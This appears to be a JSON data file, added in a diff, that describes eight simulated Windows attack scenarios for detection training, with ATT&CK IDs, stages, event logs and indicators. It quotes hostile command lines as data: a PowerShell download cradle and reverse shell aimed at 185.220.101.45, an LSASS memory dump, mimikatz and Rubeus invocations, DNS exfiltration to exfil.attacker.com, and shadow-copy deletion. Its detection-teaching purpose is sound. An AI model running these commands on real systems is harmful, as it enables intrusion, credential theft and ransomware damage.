@@ -1,0 +1,118 @@
+[
+  {"id": "powershell_abuse", "name": "PowerShell Abuse", "tactic": "Execution", "technique": "T1059.001", "severity": "High",
+   "description": "An encoded PowerShell command downloads and runs a payload in memory, avoiding files on disk.",
+   "stages": [
+     {"order": 1, "name": "Encoded launch", "action": "powershell.exe -nop -w hidden -enc <base64>", "detail": "Hidden window, no profile, base64 command to evade casual inspection."},
+     {"order": 2, "name": "Download cradle", "action": "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/a')", "detail": "Fetches a script from C2 and runs it in memory (fileless)."},
+     {"order": 3, "name": "In-memory execution", "action": "Reflectively load .NET assembly", "detail": "Runs the payload without ever writing to disk."}],
+   "processes": [{"pid": 4300, "ppid": 4100, "name": "powershell.exe", "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgA...", "verdict": "malicious"}],
+   "connections": [{"process": "powershell.exe", "remote": "185.220.101.45", "port": "80", "note": "Download cradle to C2"}],
+   "registry": [],
+   "events": [
+     {"event_id": "4104", "source": "PowerShell/Operational", "message": "Suspicious ScriptBlock: DownloadString / IEX detected"},
+     {"event_id": "1", "source": "Sysmon", "message": "Process Create: powershell.exe encoded command, parent WINWORD.EXE"},
+     {"event_id": "3", "source": "Sysmon", "message": "Network Connection: powershell.exe -> 185.220.101.45:80"}],
+   "iocs": ["185.220.101.45", "powershell -enc", "WINWORD.EXE spawning powershell"]},
+
+  {"id": "process_hollowing", "name": "Process Hollowing", "tactic": "Defense Evasion", "technique": "T1055.012", "severity": "High",
+   "description": "A benign process is started suspended, its image is replaced with malicious code, then resumed.",
+   "stages": [
+     {"order": 1, "name": "Create suspended", "action": "CreateProcess(notepad.exe, CREATE_SUSPENDED)", "detail": "A legitimate process is created but not yet running."},
+     {"order": 2, "name": "Unmap & write", "action": "NtUnmapViewOfSection + WriteProcessMemory", "detail": "The original image is removed and a malicious PE is written in."},
+     {"order": 3, "name": "Hijack thread", "action": "SetThreadContext + ResumeThread", "detail": "The entry point is redirected to malicious code; the process resumes as malware."}],
+   "processes": [{"pid": 6620, "ppid": 4300, "name": "notepad.exe", "cmdline": "notepad.exe", "verdict": "malicious"}],
+   "connections": [{"process": "notepad.exe", "remote": "185.220.101.45", "port": "443", "note": "C2 beacon from hollowed process"}],
+   "registry": [],
+   "events": [
+     {"event_id": "1", "source": "Sysmon", "message": "Process Create: notepad.exe (no window, unusual parent powershell.exe)"},
+     {"event_id": "8", "source": "Sysmon", "message": "CreateRemoteThread / SetThreadContext into notepad.exe"},
+     {"event_id": "10", "source": "Sysmon", "message": "ProcessAccess: powershell.exe opened notepad.exe with PROCESS_VM_WRITE"}],
+   "iocs": ["notepad.exe with network beacon", "RWX private memory in notepad.exe", "SetThreadContext"]},
+
+  {"id": "credential_dumping", "name": "Credential Dumping (LSASS)", "tactic": "Credential Access", "technique": "T1003.001", "severity": "Critical",
+   "description": "LSASS memory is dumped to extract NTLM hashes and Kerberos tickets.",
+   "stages": [
+     {"order": 1, "name": "Open LSASS", "action": "OpenProcess(lsass.exe, PROCESS_VM_READ)", "detail": "Requests read access to LSASS memory."},
+     {"order": 2, "name": "Dump memory", "action": "comsvcs.dll MiniDump -> lsass.dmp", "detail": "Writes LSASS memory to a file on disk."},
+     {"order": 3, "name": "Extract secrets", "action": "mimikatz sekurlsa::logonpasswords", "detail": "Parses the dump for hashes and tickets."}],
+   "processes": [{"pid": 5540, "ppid": 4300, "name": "rundll32.exe", "cmdline": "rundll32.exe comsvcs.dll, MiniDump 800 C:\\Temp\\lsass.dmp full", "verdict": "malicious"}],
+   "connections": [],
+   "registry": [],
+   "events": [
+     {"event_id": "10", "source": "Sysmon", "message": "ProcessAccess: rundll32.exe -> lsass.exe (GrantedAccess 0x1410)"},
+     {"event_id": "11", "source": "Sysmon", "message": "File Create: C:\\Temp\\lsass.dmp"},
+     {"event_id": "4688", "source": "Security", "message": "Process Create: rundll32.exe comsvcs.dll MiniDump"}],
+   "iocs": ["comsvcs.dll MiniDump", "lsass.dmp", "GrantedAccess 0x1410 to lsass"]},
+
+  {"id": "kerberoasting", "name": "Kerberoasting", "tactic": "Credential Access", "technique": "T1558.003", "severity": "High",
+   "description": "An authenticated user requests service tickets for SPNs and cracks them offline for service-account passwords.",
+   "stages": [
+     {"order": 1, "name": "Enumerate SPNs", "action": "GetUserSPNs.ps1 / setspn -q */*", "detail": "Finds accounts that have Service Principal Names."},
+     {"order": 2, "name": "Request tickets", "action": "Request RC4 TGS for target SPNs", "detail": "The KDC returns service tickets encrypted with the account's hash."},
+     {"order": 3, "name": "Crack offline", "action": "hashcat -m 13100 hashes.txt", "detail": "Recovers the service-account password offline."}],
+   "processes": [{"pid": 4300, "ppid": 4100, "name": "powershell.exe", "cmdline": "powershell -c \"Rubeus.exe kerberoast /outfile:hashes.txt\"", "verdict": "malicious"}],
+   "connections": [],
+   "registry": [],
+   "events": [
+     {"event_id": "4769", "source": "Security", "message": "Kerberos service ticket requested (RC4 0x17) for many SPNs by one user"},
+     {"event_id": "4104", "source": "PowerShell/Operational", "message": "Rubeus kerberoast ScriptBlock detected"}],
+   "iocs": ["4769 RC4 ticket burst", "Rubeus", "GetUserSPNs"]},
+
+  {"id": "registry_persistence", "name": "Registry Persistence", "tactic": "Persistence", "technique": "T1547.001", "severity": "Medium",
+   "description": "Malware adds a Run key so it launches at every logon.",
+   "stages": [
+     {"order": 1, "name": "Write Run value", "action": "New-ItemProperty HKCU\\...\\Run -Name Updater -Value payload.exe", "detail": "Adds an autostart entry pointing at the payload."},
+     {"order": 2, "name": "Persist", "action": "Value survives reboot", "detail": "The payload runs on every subsequent logon."}],
+   "processes": [{"pid": 4300, "ppid": 4100, "name": "powershell.exe", "cmdline": "powershell -c New-ItemProperty ...\\Run -Name Updater -Value payload.exe", "verdict": "malicious"}],
+   "connections": [],
+   "registry": [{"path": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "Updater", "data": "C:\\Users\\Manas\\AppData\\Roaming\\payload.exe"}],
+   "events": [
+     {"event_id": "13", "source": "Sysmon", "message": "Registry Set: HKCU\\...\\Run\\Updater -> AppData\\payload.exe"},
+     {"event_id": "4688", "source": "Security", "message": "Process Create: powershell.exe modifying a Run key"}],
+   "iocs": ["Run key -> AppData payload", "New-ItemProperty Run"]},
+
+  {"id": "reverse_shell", "name": "Reverse Shell", "tactic": "Command and Control", "technique": "T1071.001", "severity": "High",
+   "description": "A payload connects back to attacker infrastructure for interactive command execution.",
+   "stages": [
+     {"order": 1, "name": "Establish socket", "action": "New-Object Net.Sockets.TCPClient('185.220.101.45',4444)", "detail": "Outbound connection to the attacker."},
+     {"order": 2, "name": "Bind shell", "action": "Redirect stdin/stdout over the socket", "detail": "The attacker receives an interactive shell."},
+     {"order": 3, "name": "Command exec", "action": "Run commands remotely", "detail": "Full interactive control of the host."}],
+   "processes": [{"pid": 3500, "ppid": 4300, "name": "powershell.exe", "cmdline": "powershell -nop -c $c=New-Object Net.Sockets.TCPClient('185.220.101.45',4444)...", "verdict": "malicious"}],
+   "connections": [{"process": "powershell.exe", "remote": "185.220.101.45", "port": "4444", "note": "Reverse shell to C2"}],
+   "registry": [],
+   "events": [
+     {"event_id": "3", "source": "Sysmon", "message": "Network Connection: powershell.exe -> 185.220.101.45:4444"},
+     {"event_id": "4104", "source": "PowerShell/Operational", "message": "TCPClient reverse-shell ScriptBlock detected"}],
+   "iocs": ["port 4444", "TCPClient reverse shell", "powershell outbound to external"]},
+
+  {"id": "dns_tunneling", "name": "DNS Tunneling", "tactic": "Exfiltration", "technique": "T1048.003", "severity": "High",
+   "description": "Data is exfiltrated and C2 is carried inside DNS queries.",
+   "stages": [
+     {"order": 1, "name": "Encode data", "action": "base32 chunks as subdomains", "detail": "Splits data across many DNS labels."},
+     {"order": 2, "name": "Query loop", "action": "nslookup <chunk>.exfil.attacker.com", "detail": "High-volume TXT/A queries."},
+     {"order": 3, "name": "Reassemble", "action": "Attacker DNS server rebuilds the data", "detail": "Exfiltration over an allowed protocol."}],
+   "processes": [{"pid": 6120, "ppid": 4300, "name": "svch0st.exe", "cmdline": "svch0st.exe", "verdict": "malicious"}],
+   "connections": [{"process": "svch0st.exe", "remote": "8.8.8.8", "port": "53", "note": "High-volume DNS TXT tunneling"}],
+   "registry": [],
+   "events": [
+     {"event_id": "22", "source": "Sysmon", "message": "DNS Query: hundreds of TXT queries to *.exfil.attacker.com by svch0st.exe"},
+     {"event_id": "3", "source": "Sysmon", "message": "Network Connection: svch0st.exe -> 8.8.8.8:53 (UDP, high volume)"}],
+   "iocs": ["*.exfil.attacker.com", "high-volume TXT queries", "svch0st.exe masquerade"]},
+
+  {"id": "ransomware", "name": "Ransomware", "tactic": "Impact", "technique": "T1486", "severity": "Critical",
+   "description": "Backups are destroyed and files are encrypted for impact.",
+   "stages": [
+     {"order": 1, "name": "Inhibit recovery", "action": "vssadmin delete shadows /all /quiet", "detail": "Removes Volume Shadow Copies to block recovery."},
+     {"order": 2, "name": "Kill services", "action": "taskkill /f /im sqlservr.exe", "detail": "Stops processes that lock target files."},
+     {"order": 3, "name": "Encrypt", "action": "Enumerate and encrypt files; drop ransom note", "detail": "Data is encrypted and a ransom note is written."}],
+   "processes": [
+     {"pid": 5200, "ppid": 2100, "name": "Invoice_2026.pdf.exe", "cmdline": "\"Invoice_2026.pdf.exe\"", "verdict": "malicious"},
+     {"pid": 5300, "ppid": 5200, "name": "vssadmin.exe", "cmdline": "vssadmin.exe delete shadows /all /quiet", "verdict": "malicious"}],
+   "connections": [],
+   "registry": [],
+   "events": [
+     {"event_id": "1", "source": "Sysmon", "message": "Process Create: Invoice_2026.pdf.exe (double extension) from Downloads"},
+     {"event_id": "4688", "source": "Security", "message": "Process Create: vssadmin.exe delete shadows /all /quiet"},
+     {"event_id": "11", "source": "Sysmon", "message": "File Create: mass .locked files + README_RECOVER.txt"}],
+   "iocs": ["vssadmin delete shadows", "double-extension exe", "mass file renames .locked"]}
+]
